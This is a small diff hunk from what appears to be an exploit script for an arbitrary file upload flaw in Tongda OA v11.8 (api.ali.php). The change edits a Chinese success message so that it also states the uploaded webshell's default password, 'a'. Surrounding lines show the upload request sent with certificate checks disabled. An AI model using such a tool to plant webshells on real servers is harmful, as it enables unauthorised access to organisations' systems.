@@ -38,7 +38,7 @@ Content-Type: application/octet-stream
         requests.packages.urllib3.disable_warnings()
         upload = requests.post(upload_url, headers=headers, data=data, verify=False)
         if upload.status_code == 200:
-            console.print(now_time() + ' [SUCCESS]  漏洞存在 上传webshell成功，请修改日期 包含并生成文件:{}'.format(exp_url), style='bold green')
+            console.print(now_time() + ' [SUCCESS]  漏洞存在 上传webshell成功，请修改日期 包含并生成文件默认密码为a:{}'.format(exp_url), style='bold green')
         else:
             console.print(now_time() + ' [WARNING]  通达OA v11.8 api.ali.php 任意文件上传漏洞不存在', style='bold red ')
     except:
